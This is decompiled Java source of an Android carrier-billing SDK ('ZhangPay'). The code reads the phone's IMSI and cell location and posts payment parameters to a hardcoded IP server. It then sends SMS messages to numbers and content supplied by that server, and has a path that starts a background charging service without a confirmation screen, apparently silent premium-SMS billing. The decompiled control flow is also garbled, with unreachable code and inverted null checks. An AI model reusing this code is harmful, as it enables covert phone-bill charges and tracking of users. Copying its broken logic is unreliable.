package com.zhangzhifu.sdk;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import com.zhangzhifu.sdk.activity.ZhangPayActivity;
import com.zhangzhifu.sdk.service.ZhangPayPlateService;
import com.zhangzhifu.sdk.util.j;
import com.zhangzhifu.sdk.util.n;
import com.zhangzhifu.sdk.util.sms.SendSmsReceiver;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;

public class b
{
  public static b b;
  private static int x = 1;
  private static int y;
  public a a;
  private List c;
  private String d;
  private String e;
  private String f;
  private String g;
  private String h;
  private String i;
  private String j;
  private String k;
  private String l;
  private String m;
  private String n;
  private Handler o;
  private String p;
  private String q;
  private String r;
  private String s;
  private String t;
  private String u;
  private String v;
  private String w;
  
  public b() {}
  
  public static b a()
  {
    if (b == null) {
      b = new b();
    }
    return b;
  }
  
  private void a(Context paramContext, int paramInt)
  {
    new Thread(new i(this, paramContext, paramInt)).start();
  }
  
  private void a(Context paramContext, HashMap paramHashMap)
  {
    new com.zhangzhifu.sdk.util.a(paramContext);
    n.b("zhangPay_log", "获取付费协议时间起");
    com.zhangzhifu.sdk.a.e.a().e(paramContext, 1011);
    com.zhangzhifu.sdk.a.e.h(paramContext, 0);
    this.d = ((String)paramHashMap.get("channelId"));
    this.e = ((String)paramHashMap.get("priciePointId"));
    this.f = ((String)paramHashMap.get("money"));
    this.g = ((String)paramHashMap.get("cpparam"));
    this.i = ((String)paramHashMap.get("key"));
    this.j = ((String)paramHashMap.get("appId"));
    this.k = ((String)paramHashMap.get("qd"));
    this.h = ((String)paramHashMap.get("priciePointName"));
    this.l = ((String)paramHashMap.get("priciePointDec"));
    this.m = ((String)paramHashMap.get("appName"));
    this.n = ((String)paramHashMap.get(this.n));
    if ((this.l.contains("X.XX元")) || (this.l.contains("x.xx元"))) {
      x = 0;
    }
    for (;;)
    {
      com.zhangzhifu.sdk.a.e.a();
      com.zhangzhifu.sdk.a.e.m(paramContext, this.e);
      com.zhangzhifu.sdk.a.e.a();
      com.zhangzhifu.sdk.a.e.n(paramContext, this.m);
      com.zhangzhifu.sdk.a.e.a();
      com.zhangzhifu.sdk.a.e.n(paramContext, this.n);
      com.zhangzhifu.sdk.a.e.a();
      com.zhangzhifu.sdk.a.e.o(paramContext, this.l);
      if ((com.zhangzhifu.sdk.a.e.a().k(paramContext) != null) || (com.zhangzhifu.sdk.a.e.a().k(paramContext) != "")) {
        com.zhangzhifu.sdk.a.e.a().h(paramContext, "");
      }
      com.zhangzhifu.sdk.a.e.a().h(paramContext, this.h);
      if ((com.zhangzhifu.sdk.a.e.a().l(paramContext) != null) || (com.zhangzhifu.sdk.a.e.a().l(paramContext) != "")) {
        com.zhangzhifu.sdk.a.e.a().i(paramContext, "");
      }
      com.zhangzhifu.sdk.a.e.a().i(paramContext, this.f);
      System.out.println("传入数据为：---------->channelId是：" + this.d + "priciePointId是：" + this.e + "money是：" + this.f + "cpparam是：" + this.g + "key是：" + this.i + "appId是：" + this.j + "qd是：" + this.k);
      i1 = a(paramContext, this.d);
      if (i1 == 1000) {
        break;
      }
      b(i1);
      a(3);
      return;
      x = 1;
      a(paramContext, 992);
    }
    String str;
    if (e(paramContext)) {
      str = String.format("http://112.74.111.42:8000/zpayEntrancePayment?channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.d, this.e, this.f, this.g, this.j, this.k });
    }
    try
    {
      com.zhangzhifu.sdk.a.e.a(paramContext, System.currentTimeMillis());
      n.b("zhangPay_log", "md5");
      paramHashMap = com.zhangzhifu.sdk.util.l.a(str, com.zhangzhifu.sdk.util.l.a(paramContext, com.zhangzhifu.sdk.util.b.b.a(String.format("channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.d, this.e, this.f, this.g, this.j, this.k }), this.i), this.d, com.zhangzhifu.sdk.util.k.a(paramContext), 0.0D, 0.0D), paramContext).getEntity();
      try
      {
        n.b("zhangPay_log", "请求付费接口地址url：---------->" + str);
        if (paramHashMap != null) {
          break label712;
        }
        a(paramContext, 1008);
        a(5);
        b(1008);
      }
      catch (Exception paramContext)
      {
        for (;;)
        {
          label687:
          paramContext.printStackTrace();
          a(10);
          b(1008);
          n.e("zhangPay_log", "支付产生未知错误");
          continue;
          if (paramHashMap.length() > 4000)
          {
            n.b("zhangPay_log", "http request content 是：[" + paramHashMap.substring(0, 4000));
            n.b("zhangPay_log", paramHashMap.substring(4000, paramHashMap.length()) + "]");
          }
          for (;;)
          {
            i1 = 0;
            if ("-1".equals(paramHashMap))
            {
              n.c("zhangPay_log", "服务器返回未知错误，检查参数");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10090);
              i1 = -1;
            }
            if ("1".equals(paramHashMap))
            {
              n.c("zhangPay_log", "该计费点没有匹配相应的扣费通道");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10091);
              i1 = 1;
            }
            if ("2".equals(paramHashMap))
            {
              n.c("zhangPay_log", "该手机号码被列入黑名单");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10092);
              i1 = 2;
            }
            if ("3".equals(paramHashMap))
            {
              n.c("zhangPay_log", "没有相应的计费点");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10093);
              i1 = 3;
            }
            if ("4".equals(paramHashMap))
            {
              n.c("zhangPay_log", "验签错误");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10094);
              i1 = 4;
            }
            if ("5".equals(paramHashMap))
            {
              n.c("zhangPay_log", "key秘钥异常");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10095);
              i1 = 5;
            }
            if ("6".equals(paramHashMap))
            {
              n.c("zhangPay_log", "系统资费异常");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10096);
              i1 = 6;
            }
            if ("7".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10097);
              i1 = 7;
            }
            if ("8".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10098);
              i1 = 8;
            }
            if ("9".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 10099);
              i1 = 9;
            }
            if ("10".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100910);
              i1 = 10;
            }
            if ("11".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100911);
              i1 = 11;
            }
            if ("12".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100912);
              i1 = 12;
            }
            if ("13".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100911);
              i1 = 13;
            }
            if ("14".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100911);
              i1 = 14;
            }
            if ("15".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100911);
              i1 = 15;
            }
            if ("16".equals(paramHashMap))
            {
              n.c("zhangPay_log", "15s内订单重复提交");
              com.zhangzhifu.sdk.a.e.a().f(paramContext, 100911);
              i1 = 16;
            }
            if (i1 == 0) {
              break label1688;
            }
            a(7);
            switch (i1)
            {
            case 1: 
              b(10091);
              break label687;
              n.b("zhangPay_log", "http request content 是：[" + paramHashMap + "]");
            }
          }
          b(10092);
          continue;
          b(10093);
          continue;
          b(10094);
          continue;
          b(10095);
          continue;
          b(10096);
          continue;
          b(10097);
          continue;
          b(10098);
          continue;
          b(10099);
          continue;
          b(100910);
          continue;
          b(100911);
          continue;
          b(100912);
          continue;
          b(100911);
          continue;
          b(100911);
          continue;
          b(100911);
          continue;
          b(100911);
          continue;
          paramHashMap = com.zhangzhifu.sdk.util.c.a(paramHashMap, "utf-8");
          paramHashMap = c.a().a(paramHashMap);
          if ((paramHashMap != null) || (!paramHashMap.equals("")))
          {
            this.c = new com.zhangzhifu.sdk.d.a().a(paramHashMap, paramContext);
            n.e("zhangPay_log", "计费通道的数量是：" + this.c.size());
            if ((this.c != null) && (this.c.size() > 0))
            {
              c(paramContext);
              a(paramContext, this.c);
              a(paramContext, 999);
              n.b("zhangPay_log", "获取付费协议时间终");
              int i2 = 0;
              if (com.zhangzhifu.sdk.a.e.d(paramContext) == 1)
              {
                n.c("zhangPay_log", "ZhangPay计费提示框启动");
                n.c("zhangPay_log", "当前弹窗为：[ 是]");
                i1 = i2;
                if (this.o == null)
                {
                  n.c("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
                  paramHashMap = new Intent();
                  paramHashMap.setClass(paramContext, ZhangPayActivity.class);
                  paramHashMap.addFlags(268435456);
                  paramHashMap.putExtra("enterType", 1111);
                  paramContext.startActivity(paramHashMap);
                  i1 = i2;
                }
              }
              for (;;)
              {
                a(i1);
                break;
                if ((com.zhangzhifu.sdk.a.e.d(paramContext) == 0) && (x == 0))
                {
                  n.c("zhangPay_log", "当前弹窗为：[ 否]");
                  i1 = 1;
                  paramContext.startService(new Intent(paramContext, ZhangPayPlateService.class));
                  a(paramContext);
                }
                else
                {
                  n.c("zhangPay_log", "当前弹窗为：[ 是]");
                  i1 = i2;
                  if (this.o == null)
                  {
                    n.c("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
                    paramHashMap = new Intent();
                    paramHashMap.setClass(paramContext, ZhangPayActivity.class);
                    paramHashMap.addFlags(268435456);
                    paramHashMap.putExtra("enterType", 1111);
                    paramContext.startActivity(paramHashMap);
                    i1 = i2;
                  }
                }
              }
            }
          }
        }
      }
      n.b("zhangPay_log", "start 获取xml");
      return;
    }
    catch (Exception paramHashMap)
    {
      for (;;)
      {
        n.e("zhangPay_log", "导致错误的情况有，1：网络无法连接，2：话费协议获取失败，3：在UI线程调用pay支付接口！");
        paramHashMap = null;
        continue;
        label712:
        paramHashMap = com.zhangzhifu.sdk.util.l.a(paramHashMap.getContent());
        if ((paramHashMap != null) || (!"".equals(paramHashMap))) {
          break;
        }
        a(paramContext, 1008);
        a(6);
        b(1008);
      }
    }
  }
  
  private static void a(Context paramContext, List paramList)
  {
    int i1;
    if (paramList != null)
    {
      com.zhangzhifu.sdk.a.b.a().b(paramContext);
      com.zhangzhifu.sdk.a.d.a().b(paramContext);
      com.zhangzhifu.sdk.a.c.a().b(paramContext);
      com.zhangzhifu.sdk.a.a.a().b(paramContext);
      i1 = 0;
      if (i1 < paramList.size()) {}
    }
    else
    {
      return;
    }
    com.zhangzhifu.sdk.b.a localA = (com.zhangzhifu.sdk.b.a)paramList.get(i1);
    if ((localA instanceof com.zhangzhifu.sdk.b.l)) {
      com.zhangzhifu.sdk.a.d.a().a((com.zhangzhifu.sdk.b.l)localA, paramContext);
    }
    for (;;)
    {
      i1 += 1;
      break;
      if ((localA instanceof com.zhangzhifu.sdk.b.h))
      {
        com.zhangzhifu.sdk.a.b.a().a((com.zhangzhifu.sdk.b.h)localA, paramContext);
      }
      else if ((localA instanceof com.zhangzhifu.sdk.b.k))
      {
        com.zhangzhifu.sdk.a.c.a().a((com.zhangzhifu.sdk.b.k)localA, paramContext);
      }
      else if ((localA instanceof com.zhangzhifu.sdk.b.e))
      {
        System.out.println("数据库里面增加");
        com.zhangzhifu.sdk.a.a.a().a((com.zhangzhifu.sdk.b.e)localA, paramContext);
      }
    }
  }
  
  public int a(Context paramContext, String paramString)
  {
    paramString = com.zhangzhifu.sdk.util.i.a(paramContext);
    com.zhangzhifu.sdk.util.g localG = new com.zhangzhifu.sdk.util.g(paramContext);
    boolean bool1 = localG.a();
    boolean bool2 = localG.a(paramContext);
    paramContext = j.c(paramContext);
    n.c("zhangPay_log", "当前设备IMSI号码：[" + paramContext + "]");
    if (!paramString.a()) {
      return 1006;
    }
    if ((!bool1) && (!bool2)) {
      return 1007;
    }
    return 1000;
  }
  
  public int a(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    if ((paramString1 != null) || ((paramString1.equals("")) && (paramString2 != null)) || ((paramString2.equals("")) && (paramString3 != null)) || (paramString3.equals("")))
    {
      com.zhangzhifu.sdk.util.i localI = com.zhangzhifu.sdk.util.i.a(paramContext);
      com.zhangzhifu.sdk.a.e.h(paramContext).trim();
      String str1 = com.zhangzhifu.sdk.a.e.a().m(paramContext);
      com.zhangzhifu.sdk.a.e.a();
      String str2 = com.zhangzhifu.sdk.a.e.n(paramContext);
      com.zhangzhifu.sdk.a.e.a();
      com.zhangzhifu.sdk.a.e.o(paramContext);
      if ((str1 == null) || (str1.equals("")))
      {
        com.zhangzhifu.sdk.a.e.a().j(paramContext, paramString1);
        if ((str2 != null) && (!str2.equals(""))) {
          break label200;
        }
        com.zhangzhifu.sdk.a.e.a();
        com.zhangzhifu.sdk.a.e.k(paramContext, paramString3);
        label131:
        if ((str1 != null) && (!str1.equals(""))) {
          break label213;
        }
        com.zhangzhifu.sdk.a.e.a();
        com.zhangzhifu.sdk.a.e.l(paramContext, paramString2);
      }
      boolean bool1;
      boolean bool2;
      for (;;)
      {
        paramString2 = new com.zhangzhifu.sdk.util.g(paramContext);
        bool1 = paramString2.a();
        bool2 = paramString2.a(paramContext);
        if (localI.a()) {
          break label225;
        }
        return 1006;
        com.zhangzhifu.sdk.a.e.a().j(paramContext, paramString1);
        break;
        label200:
        com.zhangzhifu.sdk.a.e.a();
        com.zhangzhifu.sdk.a.e.k(paramContext, paramString3);
        break label131;
        label213:
        com.zhangzhifu.sdk.a.e.a();
        com.zhangzhifu.sdk.a.e.l(paramContext, paramString2);
      }
      label225:
      n.c("zhangPay_log", "当前掌支付SDK的版本为：[ 3.4.15]");
      if ((!bool1) && (!bool2)) {
        return 1007;
      }
      try
      {
        paramString2 = com.zhangzhifu.sdk.util.l.a("http://112.74.111.42:8000/zpayinit" + "?type=1", com.zhangzhifu.sdk.util.l.a(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = com.zhangzhifu.sdk.util.l.a(paramString2);
          if (paramString2 != null)
          {
            paramString2 = com.zhangzhifu.sdk.util.a.d.a(paramString2);
            this.p = paramString2.a();
            this.r = paramString2.c();
            this.q = paramString2.b();
            this.s = paramString2.d();
            System.out.println("maochiCode是：" + this.p + "maochiMobel是：" + this.q + "maochiContent是：" + this.r + "maochiImsi是：" + this.s);
          }
        }
        paramString2 = com.zhangzhifu.sdk.util.l.a("http://112.74.111.42:8000/zpayinit" + "?type=2", com.zhangzhifu.sdk.util.l.a(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = com.zhangzhifu.sdk.util.l.a(paramString2);
          if (paramString2 != null)
          {
            paramString2 = com.zhangzhifu.sdk.util.a.d.a(paramString2);
            this.t = paramString2.a();
            this.v = paramString2.c();
            this.u = paramString2.b();
            this.w = paramString2.d();
            System.out.println("maochiCodeQ是：" + this.t + "maochiMobelQ是：" + this.u + "maochiContentQ是：" + this.v + "maochiImsiQ是：" + this.w);
          }
        }
      }
      catch (Exception paramString2)
      {
        for (;;)
        {
          n.d("zhangPay_log", "初始化可能不成功；请保证设备可联网，有SIM卡并有话费！");
        }
      }
      n.b("zhangPay_log", "初始化结果为：1000");
      d.a().a(paramContext, paramString1, 1000);
      return 1000;
    }
    n.b("zhangPay_log", "初始化结果为：998");
    return 998;
  }
  
  public void a(int paramInt)
  {
    if (this.o != null) {
      this.o.sendEmptyMessage(paramInt);
    }
  }
  
  public void a(Context paramContext)
  {
    com.zhangzhifu.sdk.a.e.a().e(paramContext, 1011);
    new Thread(new f(this, paramContext)).start();
    d(paramContext);
  }
  
  public void a(Context paramContext, HashMap paramHashMap, a paramA, Handler paramHandler)
  {
    this.o = paramHandler;
    this.a = paramA;
    a(paramContext, paramHashMap);
  }
  
  public void b()
  {
    if (this.o != null)
    {
      this.o.post(new g(this));
      return;
    }
    this.a.a(this.e, "1001");
  }
  
  public void b(int paramInt)
  {
    if (this.o != null)
    {
      this.o.post(new h(this, paramInt));
      return;
    }
    if (this.a == null) {
      throw new RuntimeException("ZhangPayCallback is null ? == 回调函数不能为空。");
    }
    this.a.b(this.e, paramInt);
  }
  
  public void b(Context paramContext)
  {
    HashMap localHashMap = com.zhangzhifu.sdk.util.k.a(paramContext);
    try
    {
      com.zhangzhifu.sdk.a.e.a(paramContext, "lac", (String)localHashMap.get("lac"));
      com.zhangzhifu.sdk.a.e.a(paramContext, "mcc", (String)localHashMap.get("mcc"));
      com.zhangzhifu.sdk.a.e.a(paramContext, "mnc", (String)localHashMap.get("mnc"));
      com.zhangzhifu.sdk.a.e.a(paramContext, "cid", (String)localHashMap.get("cid"));
      n.e("zhangPay_log", "lac:" + (String)localHashMap.get("lac") + "mcc:" + (String)localHashMap.get("mcc") + "mnc:" + (String)localHashMap.get("mnc") + "cid:" + (String)localHashMap.get("cid"));
      return;
    }
    catch (Exception paramContext)
    {
      n.e("zhangPay_log", "定位失败");
    }
  }
  
  public void c(Context paramContext)
  {
    try
    {
      if (((this.q != null) || (this.q.length() > 0)) && (this.p.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.a(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.q);
        localIntent.putExtra("content", this.r);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
        com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, this.q);
        com.zhangzhifu.sdk.util.sms.c.a.b(paramContext, com.zhangzhifu.sdk.a.e.a().s(paramContext));
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public void d(Context paramContext)
  {
    try
    {
      if (((this.u != null) || (this.u.length() > 0)) && (this.t.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.a(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.u);
        localIntent.putExtra("content", this.v);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
        com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, this.q);
        com.zhangzhifu.sdk.util.sms.c.a.b(paramContext, com.zhangzhifu.sdk.a.e.a().s(paramContext));
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public boolean e(Context paramContext)
  {
    System.out.println("是否具备请求条件" + com.zhangzhifu.sdk.util.e.a(paramContext));
    if (com.zhangzhifu.sdk.util.e.a(paramContext))
    {
      if (com.zhangzhifu.sdk.util.e.a(1, paramContext)) {
        return true;
      }
      a(11);
      b(990);
      return false;
    }
    a(12);
    b(991);
    return false;
  }
}
